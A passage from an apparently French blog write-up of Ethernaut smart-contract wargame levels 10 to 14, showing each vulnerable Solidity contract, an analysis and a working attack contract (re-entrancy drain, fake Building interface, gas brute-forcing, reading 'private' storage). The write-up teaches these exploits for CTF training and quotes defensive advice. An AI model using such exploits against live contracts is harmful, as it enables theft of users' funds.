  <span class="p">}</span>

  <span class="kd">function</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">payable</span> <span class="p">{}</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="analyse-9">Analyse</h3>

<p>Nous avons à faire à un smart contract qui peut-être attaqué avec une Re-entrancy attack. De bonnes ressources sont disponibles sur internet.</p>

<p>Ce type de faille est facilement reconnaissable avec ces types d’appels:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">.</span><span class="nx">call</span><span class="p">.</span><span class="nx">value</span><span class="p">(</span><span class="nx">_amount</span><span class="p">)(</span><span class="s2">""</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">.</span><span class="nx">call</span><span class="p">.</span><span class="nx">value</span><span class="p">(</span><span class="nx">_amount</span><span class="p">)());</span>
</code></pre></div></div>

<h3 id="attaque-9">Attaque</h3>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">contract</span> <span class="nx">Attack</span> <span class="p">{</span>
    <span class="nx">Reentrance</span> <span class="kr">public</span> <span class="nx">original</span><span class="p">;</span>
    
    <span class="kd">constructor</span><span class="p">(</span><span class="nx">address</span> <span class="nx">payable</span> <span class="nx">addr</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
        <span class="nx">original</span> <span class="o">=</span> <span class="nx">Reentrance</span><span class="p">(</span><span class="nx">addr</span><span class="p">);</span>
    <span class="p">}</span>
    
    <span class="kd">function</span> <span class="nx">go</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
        <span class="nx">original</span><span class="p">.</span><span class="nx">donate</span><span class="p">.</span><span class="nx">value</span><span class="p">(</span><span class="mi">1</span> <span class="nx">ether</span><span class="p">)(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>
        <span class="nx">original</span><span class="p">.</span><span class="nx">withdraw</span><span class="p">(</span><span class="mi">1</span> <span class="nx">ether</span><span class="p">);</span>
    <span class="p">}</span>
    
    <span class="kd">function</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">payable</span> <span class="p">{</span>
        <span class="nx">original</span><span class="p">.</span><span class="nx">withdraw</span><span class="p">(</span><span class="mi">1</span> <span class="nx">ether</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>In order to prevent re-entrancy attacks when moving funds out of your contract, use the <a href="https://solidity.readthedocs.io/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern">Checks-Effects-Interactions pattern</a> being aware that <code class="highlighter-rouge">call</code> will only return false without interrupting the execution flow. Solutions such as <a href="https://docs.openzeppelin.com/contracts/2.x/api/utils#ReentrancyGuard">ReentrancyGuard</a> or <a href="https://docs.openzeppelin.com/contracts/2.x/api/payment#PullPayment">PullPayment</a> can also be used.</p>

  <p><code class="highlighter-rouge">transfer</code> and <code class="highlighter-rouge">send</code> are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork <a href="https://diligence.consensys.net/blog/2019/09/stop-using-soliditys-transfer-now/">Source 1</a> <a href="https://forum.openzeppelin.com/t/reentrancy-after-istanbul/1742">Source 2</a>.</p>

  <p>Always assume that the receiver of the funds you are sending can be another  contract, not just a regular address. Hence, it can execute code in its  payable fallback method and <em>re-enter</em> your contract, possibly messing up your state/logic.</p>

  <p>Re-entrancy is a common attack. You should always be prepared for it!</p>

  <h4 id="the-dao-hack">The DAO Hack</h4>

  <p>The famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See <a href="https://blog.openzeppelin.com/15-lines-of-code-that-could-have-prevented-thedao-hack-782499e00942">15 lines of code that could have prevented TheDAO Hack</a>.</p>
</blockquote>

<hr />

<h2 id="11---elevator">11 - Elevator</h2>

<hr />

<blockquote>
  <p><strong>TL;DR</strong></p>

  <p>Contrôler une fonction pour modifier le cheminement.</p>
</blockquote>

<p>This elevator won’t let you reach the top of your building. Right?</p>

<h5 id="things-that-might-help">Things that might help:</h5>

<ul>
  <li>Sometimes solidity is not good at keeping promises.</li>
  <li>This <code class="highlighter-rouge">Elevator</code> expects to be used from a <code class="highlighter-rouge">Building</code>.</li>
</ul>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.5</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="kr">interface</span> <span class="nx">Building</span> <span class="p">{</span>
  <span class="kd">function</span> <span class="nx">isLastFloor</span><span class="p">(</span><span class="nx">uint</span><span class="p">)</span> <span class="nx">external</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">bool</span><span class="p">);</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">Elevator</span> <span class="p">{</span>
  <span class="nx">bool</span> <span class="kr">public</span> <span class="nx">top</span><span class="p">;</span>
  <span class="nx">uint</span> <span class="kr">public</span> <span class="nx">floor</span><span class="p">;</span>

  <span class="kd">function</span> <span class="nx">goTo</span><span class="p">(</span><span class="nx">uint</span> <span class="nx">_floor</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">Building</span> <span class="nx">building</span> <span class="o">=</span> <span class="nx">Building</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nx">building</span><span class="p">.</span><span class="nx">isLastFloor</span><span class="p">(</span><span class="nx">_floor</span><span class="p">))</span> <span class="p">{</span>
      <span class="nx">floor</span> <span class="o">=</span> <span class="nx">_floor</span><span class="p">;</span>
      <span class="nx">top</span> <span class="o">=</span> <span class="nx">building</span><span class="p">.</span><span class="nx">isLastFloor</span><span class="p">(</span><span class="nx">floor</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="analyse-10">Analyse</h3>

<p>Notre objectif est de mettre <code class="highlighter-rouge">top</code> à la valeur <code class="highlighter-rouge">true</code>. Pour cela, il faut  que le premier appel à  <code class="highlighter-rouge">building.isLastFloor(_floor)</code> retourne <code class="highlighter-rouge">false</code> puis le second appel renvoi <code class="highlighter-rouge">true</code>.</p>

<p>Pour cela, nous allons simplement créer notre propre contract <code class="highlighter-rouge">Building</code> et redéfinir la fonction <code class="highlighter-rouge">isLastFloor()</code> comme expliqué précédemment.</p>

<h3 id="attaque-10">Attaque</h3>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">contract</span> <span class="nx">Building</span> <span class="p">{</span>
    
    <span class="nx">Elevator</span> <span class="kr">public</span> <span class="nx">object</span><span class="p">;</span>
    <span class="nx">bool</span> <span class="nx">already</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
    
    <span class="kd">function</span> <span class="nx">go</span><span class="p">(</span><span class="nx">address</span> <span class="nx">addr</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
        <span class="nx">object</span> <span class="o">=</span> <span class="nx">Elevator</span><span class="p">(</span><span class="nx">addr</span><span class="p">);</span>
        <span class="nx">object</span><span class="p">.</span><span class="nx">goTo</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
    <span class="p">}</span>
    
    <span class="kd">function</span> <span class="nx">isLastFloor</span><span class="p">(</span><span class="nx">uint</span> <span class="nx">floor</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">already</span> <span class="o">==</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">already</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>You can use the <code class="highlighter-rouge">view</code> function modifier on an interface in order to prevent state modifications. The <code class="highlighter-rouge">pure</code> modifier also prevents functions from modifying the state. Make sure you read <a href="http://solidity.readthedocs.io/en/develop/contracts.html#view-functions">Solidity’s documentation</a> and learn its caveats.</p>

  <p>An alternative way to solve this level is to build a view function which  returns different results depends on input data but don’t modify state,  e.g. <code class="highlighter-rouge">gasleft()</code>.</p>
</blockquote>

<hr />

<h2 id="12---privacy">12 - Privacy</h2>

<hr />

<blockquote>
  <p><strong>TL;DR</strong></p>

  <p>Lire la blockchain pour trouver la valeur qui permet de débloquer le smart contract.</p>
</blockquote>

<p>The creator of this contract was careful enough to protect the sensitive areas of its storage.</p>

<p>Unlock this contract to beat the level.</p>

<p>Things that might help:</p>

<ul>
  <li>Understanding how storage works</li>
  <li>Understanding how parameter parsing works</li>
  <li>Understanding how casting works</li>
</ul>

<p>Tips:</p>

<ul>
  <li>Remember that metamask is just a commodity. Use another tool if it is presenting problems. Advanced gameplay could involve using remix, or your own web3 provider.</li>
</ul>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.5</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Privacy</span> <span class="p">{</span>

  <span class="nx">bool</span> <span class="kr">public</span> <span class="nx">locked</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
  <span class="nx">uint256</span> <span class="kr">public</span> <span class="nx">ID</span> <span class="o">=</span> <span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">;</span>
  <span class="nx">uint8</span> <span class="kr">private</span> <span class="nx">flattening</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
  <span class="nx">uint8</span> <span class="kr">private</span> <span class="nx">denomination</span> <span class="o">=</span> <span class="mi">255</span><span class="p">;</span>
  <span class="nx">uint16</span> <span class="kr">private</span> <span class="nx">awkwardness</span> <span class="o">=</span> <span class="nx">uint16</span><span class="p">(</span><span class="nx">now</span><span class="p">);</span>
  <span class="nx">bytes32</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="kr">private</span> <span class="nx">data</span><span class="p">;</span>

  <span class="kd">constructor</span><span class="p">(</span><span class="nx">bytes32</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="nx">memory</span> <span class="nx">_data</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">data</span> <span class="o">=</span> <span class="nx">_data</span><span class="p">;</span>
  <span class="p">}</span>
  
  <span class="kd">function</span> <span class="nx">unlock</span><span class="p">(</span><span class="nx">bytes16</span> <span class="nx">_key</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">require</span><span class="p">(</span><span class="nx">_key</span> <span class="o">==</span> <span class="nx">bytes16</span><span class="p">(</span><span class="nx">data</span><span class="p">[</span><span class="mi">2</span><span class="p">]));</span>
    <span class="nx">locked</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="cm">/*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="analyse-11">Analyse</h3>

<p>Notre but est d’avoir <code class="highlighter-rouge">locked</code> à <code class="highlighter-rouge">false</code>. Pour cela, nous devons connaître la valeur de <code class="highlighter-rouge">data[2]</code>.</p>

<p>On peut soit utiliser <code class="highlighter-rouge">myth</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>docker run <span class="nt">-it</span> <span class="nt">--net</span><span class="o">=</span>host <span class="nt">-e</span> <span class="nv">INFURA_ID</span><span class="o">=</span>2f41df8d365740f88e9dd04b27121b10 mythril/myth read-storage <span class="nt">--rpc</span> infura-ropsten 0,5 0xA2658BF87985AA3FDBAE8D583BBE833541F989E2
0x0: 0x0000000000000000000000000000000000000000000000000000000000000001 <span class="c"># slot 0</span>
<span class="c"># 01: bool public locked = true;</span>
0x1: 0x000000000000000000000000000000000000000000000000000000005ec6de35 <span class="c"># slot 1</span>
<span class="c"># 5ec6de35: uint256 public ID = block.timestamp; (epoch date)</span>
0x2: 0x00000000000000000000000000000000000000000000000000000000de35ff0a <span class="c"># slot 2</span>
<span class="c"># 0a: uint8 private flattening = 10;</span>
<span class="c"># ff: uint8 private denomination = 255;</span>
<span class="c"># de35: uint16 private awkwardness = uint16(now);</span>
0x3: 0x62bced84fa5500b88774e56f38ca29ee894cc1a6ffd59d366e7aef76e93ada0b <span class="c"># slot 3</span>
<span class="c"># data[0]</span>
0x4: 0x0629adc4d6cd7bf2add11921eeb106385635e233b5377a5552cdd994b6ae9d80 <span class="c"># slot 4</span>
<span class="c"># data[1]</span>
0x5: 0xd8a145f5f299502569822b0c169e864f8e299d3e8ce7f7625d658007419d93f7 <span class="c"># slot 5</span>
<span class="c"># data[2]</span>
0x6: 0x0000000000000000000000000000000000000000000000000000000000000000
0x7: 0x0000000000000000000000000000000000000000000000000000000000000000
0x8: 0x0000000000000000000000000000000000000000000000000000000000000000
0x9: 0x0000000000000000000000000000000000000000000000000000000000000000
</code></pre></div></div>

<p>Soit utiliser <code class="highlighter-rouge">web3</code>:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="s2">"0xA2658bf87985AA3fdBAE8d583BbE833541F989e2"</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
<span class="s2">"0x0000000000000000000000000000000000000000000000000000000000000001"</span>
<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="s2">"0xA2658bf87985AA3fdBAE8d583BbE833541F989e2"</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
<span class="s2">"0x000000000000000000000000000000000000000000000000000000005ec6de35"</span>
<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="s2">"0xA2658bf87985AA3fdBAE8d583BbE833541F989e2"</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span>
<span class="s2">"0x00000000000000000000000000000000000000000000000000000000de35ff0a"</span>
<span class="p">...</span>
</code></pre></div></div>

<h3 id="attaque-11">Attaque</h3>

<p>Nous avons la valeur de <code class="highlighter-rouge">data[2]</code>, on peut unlock.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">locked</span><span class="p">()</span>
<span class="kc">true</span>

<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">unlock</span><span class="p">(</span><span class="s2">"0xd8a145f5f299502569822b0c169e864f8e299d3e8ce7f7625d658007419d93f7"</span><span class="p">);</span>

<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">locked</span><span class="p">()</span>
<span class="kc">false</span>
</code></pre></div></div>

<blockquote>
  <p>Nothing in the ethereum blockchain is private. The keyword private is merely an artificial construct of the Solidity language. Web3’s <code class="highlighter-rouge">getStorageAt(...)</code> can be used to read anything from storage. It can be tricky to read  what you want though, since several optimization rules and techniques  are used to compact the storage as much as possible.</p>

  <p>It can’t get much more complicated than what was exposed in this level. For more, check out this excellent article by “Darius”: <a href="https://medium.com/aigang-network/how-to-read-ethereum-contract-storage-44252c8af925">How to read Ethereum contract storage</a></p>
</blockquote>

<hr />

<h2 id="13---gatekeeper-one">13 - Gatekeeper One</h2>

<hr />

<blockquote>
  <p><strong>TL;DR</strong></p>

  <p>Devenir propriétaire en fournissant une valeur qui respecte plusieurs contraintes.</p>
</blockquote>

<p>Make it past the gatekeeper and register as an entrant to pass this level.</p>

<h5 id="things-that-might-help-1">Things that might help:</h5>

<ul>
  <li>Remember what you’ve learned from the Telephone and Token levels.</li>
  <li>You can learn more about the <code class="highlighter-rouge">msg.gas</code> special variable, or its preferred alias <code class="highlighter-rouge">gasleft()</code>, in Solidity’s documentation (see <a href="http://solidity.readthedocs.io/en/v0.4.23/units-and-global-variables.html">here</a> and <a href="http://solidity.readthedocs.io/en/v0.4.23/control-structures.html#external-function-calls">here</a>).</li>
</ul>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.5</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="s1">'openzeppelin-solidity/contracts/math/SafeMath.sol'</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">GatekeeperOne</span> <span class="p">{</span>

  <span class="nx">using</span> <span class="nx">SafeMath</span> <span class="k">for</span> <span class="nx">uint256</span><span class="p">;</span>
  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">entrant</span><span class="p">;</span>

  <span class="nx">modifier</span> <span class="nx">gateOne</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">!=</span> <span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">);</span>
    <span class="nx">_</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="nx">modifier</span> <span class="nx">gateTwo</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">require</span><span class="p">(</span><span class="nx">gasleft</span><span class="p">().</span><span class="nx">mod</span><span class="p">(</span><span class="mi">8191</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>
    <span class="nx">_</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="nx">modifier</span> <span class="nx">gateThree</span><span class="p">(</span><span class="nx">bytes8</span> <span class="nx">_gateKey</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">require</span><span class="p">(</span><span class="nx">uint32</span><span class="p">(</span><span class="nx">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">))</span> <span class="o">==</span> <span class="nx">uint16</span><span class="p">(</span><span class="nx">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">)),</span> <span class="s2">"GatekeeperOne: invalid gateThree part one"</span><span class="p">);</span>
      <span class="nx">require</span><span class="p">(</span><span class="nx">uint32</span><span class="p">(</span><span class="nx">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">))</span> <span class="o">!=</span> <span class="nx">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">),</span> <span class="s2">"GatekeeperOne: invalid gateThree part two"</span><span class="p">);</span>
      <span class="nx">require</span><span class="p">(</span><span class="nx">uint32</span><span class="p">(</span><span class="nx">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">))</span> <span class="o">==</span> <span class="nx">uint16</span><span class="p">(</span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">),</span> <span class="s2">"GatekeeperOne: invalid gateThree part three"</span><span class="p">);</span>
    <span class="nx">_</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nx">enter</span><span class="p">(</span><span class="nx">bytes8</span> <span class="nx">_gateKey</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">gateOne</span> <span class="nx">gateTwo</span> <span class="nx">gateThree</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">)</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">entrant</span> <span class="o">=</span> <span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">;</span>
    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="analyse-12">Analyse</h3>

<p>Le but de ce niveau est d’exécuter le corps de la fonction <code class="highlighter-rouge">enter()</code>. Pour cela, il faut respecter les contraintes imposées par les modifieurs <code class="highlighter-rouge">gateOne()</code>, <code class="highlighter-rouge">gateTwo()</code> et <code class="highlighter-rouge">gateThree()</code>.</p>

<p>Pour passer le <code class="highlighter-rouge">gateOne()</code>, il suffit de réaliser notre attaque depuis un autre smart contrat, facile.</p>

<p>Pour passer le <code class="highlighter-rouge">gateTwo()</code>, le <code class="highlighter-rouge">gazleft()</code> courant lors de l’exécution de l’instruction doit être un multiple de <code class="highlighter-rouge">8191</code>, c’est plutôt facile de le faire en local, un peu plus compliqué pendant la vraie attaque. Nous devons debugger et faire un peu de brute force.</p>

<p>Pour passer le <code class="highlighter-rouge">gateThree()</code>, nous devons faire respecter quelques conditions à la valeur de <code class="highlighter-rouge">_gateKey</code>, plutôt facile.</p>

<h3 id="attaque-12">Attaque</h3>

<p>Pour <code class="highlighter-rouge">_gateKey</code>, nous allons partir de <code class="highlighter-rouge">0x0000111122223333</code> et lui ajouter les contraintes:</p>

<ul>
  <li>contrainte 1: <code class="highlighter-rouge">0x0000111100003333</code></li>
  <li>contrainte 2: <code class="highlighter-rouge">0x4444111100003333</code></li>
  <li>contrainte 3: <code class="highlighter-rouge">0x444411110000XXXX</code> (<code class="highlighter-rouge">XXXX</code> doivent être les 16 dernier bits de <code class="highlighter-rouge">tx.origin</code>)</li>
</ul>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">contract</span> <span class="nx">Attack</span> <span class="p">{</span>
    <span class="nx">GatekeeperOne</span> <span class="nx">object</span><span class="p">;</span>
    <span class="nx">bytes8</span> <span class="nx">key</span> <span class="o">=</span> <span class="nx">bytes8</span><span class="p">(</span><span class="mh">0x4444111100000000</span> <span class="o">|</span> <span class="nx">uint16</span><span class="p">(</span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">));</span>
    
    <span class="kd">constructor</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">addr</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">object</span> <span class="o">=</span> <span class="nx">GatekeeperOne</span><span class="p">(</span><span class="nx">addr</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nx">enterGate</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="k">for</span> <span class="p">(</span><span class="nx">uint256</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">120</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="p">(</span><span class="nx">bool</span> <span class="nx">ret</span><span class="p">,</span> <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">data</span><span class="p">)</span> <span class="o">=</span> <span class="nx">address</span><span class="p">(</span><span class="nx">object</span><span class="p">).</span><span class="nx">call</span><span class="p">{</span><span class="nl">gas</span><span class="p">:</span> <span class="nx">i</span> <span class="o">+</span> <span class="mi">150</span> <span class="o">+</span> <span class="mi">8191</span><span class="o">*</span><span class="mi">3</span><span class="p">}(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodeWithSignature</span><span class="p">(</span><span class="s1">'enter(bytes8)'</span><span class="p">,</span> <span class="nx">key</span><span class="p">));</span>
            <span class="k">if</span> <span class="p">(</span><span class="nx">ret</span><span class="p">)</span>
                <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">// 3000000 - 4753 - 0x4b - 1</span>
</code></pre></div></div>

<blockquote>
  <p>Well done! Next, try your hand with the second gatekeeper…</p>
</blockquote>

<hr />

<h2 id="14---gatekepper-two">14 - Gatekepper Two</h2>

<hr />

<blockquote>
  <p><strong>TL;DR</strong></p>

  <p>Même principe que le précédent niveau, nous devons avoir <code class="highlighter-rouge">extcodesize</code> qui retourne 0 et une condition sur une valeur.</p>
</blockquote>

<p>This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.</p>

<h5 id="things-that-might-help-2">Things that might help:</h5>

<ul>
  <li>Remember what you’ve learned from getting past the first gatekeeper - the first gate is the same.</li>
  <li>The <code class="highlighter-rouge">assembly</code> keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See <a href="http://solidity.readthedocs.io/en/v0.4.23/assembly.html">here</a> for more information. The <code class="highlighter-rouge">extcodesize</code> call in this gate will get the size of a contract’s code at a given  address - you can learn more about how and when this is set in section 7 of the <a href="https://ethereum.github.io/yellowpaper/paper.pdf">yellow paper</a>.</li>
  <li>The <code class="highlighter-rouge">^</code> character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see <a href="http://solidity.readthedocs.io/en/v0.4.23/miscellaneous.html#cheatsheet">here</a>). The Coin Flip level is also a good place to start when approaching this challenge.</li>
</ul>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.5</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">GatekeeperTwo</span> <span class="p">{</span>

  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">entrant</span><span class="p">;</span>

  <span class="nx">modifier</span> <span class="nx">gateOne</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">!=</span> <span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">);</span>
    <span class="nx">_</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="nx">modifier</span> <span class="nx">gateTwo</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">uint</span> <span class="nx">x</span><span class="p">;</span>
    <span class="nx">assembly</span> <span class="p">{</span> <span class="nl">x</span> <span class="p">:</span><span class="o">=</span> <span class="nx">extcodesize</span><span class="p">(</span><span class="nx">caller</span><span class="p">)</span> <span class="p">}</span>
    <span class="nx">require</span><span class="p">(</span><span class="nx">x</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>
    <span class="nx">_</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="nx">modifier</span> <span class="nx">gateThree</span><span class="p">(</span><span class="nx">bytes8</span> <span class="nx">_gateKey</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">require</span><span class="p">(</span><span class="nx">uint64</span><span class="p">(</span><span class="nx">bytes8</span><span class="p">(</span><span class="nx">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">))))</span> <span class="o">^</span> <span class="nx">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">)</span> <span class="o">==</span> <span class="nx">uint64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
    <span class="nx">_</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nx">enter</span><span class="p">(</span><span class="nx">bytes8</span> <span class="nx">_gateKey</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">gateOne</span> <span class="nx">gateTwo</span> <span class="nx">gateThree</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">)</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">entrant</span> <span class="o">=</span> <span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">;</span>
    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="analyse-13">Analyse</h3>

<p>Ce niveau est proche du précédent, nous devons respecter les conditions définies par les 3 modifieurs.</p>

<p>Pour passer <code class="highlighter-rouge">gateTwo()</code>, il faut que <code class="highlighter-rouge">extcodesize(caller)</code> retourne 0. Nous devons donc appeler <code class="highlighter-rouge">enter()</code> depuis le constructeur de notre contrat.</p>

<blockquote>
  <p>Google: solidity extcodesize</p>

  <p><strong>Edit: <code class="highlighter-rouge">EXTCODESIZE</code> returns 0 if it is called from  the constructor of a contract. So if you are using this in a security  sensitive setting, you would have to consider if this is a problem.</strong></p>
</blockquote>

<p>Pour passer <code class="highlighter-rouge">gateThree()</code>, il faut simplement respecter la condition, appliqué sur <code class="highlighter-rouge">gateKey</code>. Nous devons appliquer une inversion binaire (bit-wise operation <code class="highlighter-rouge">~</code>).</p>

<h3 id="attaque-13">Attaque</h3>

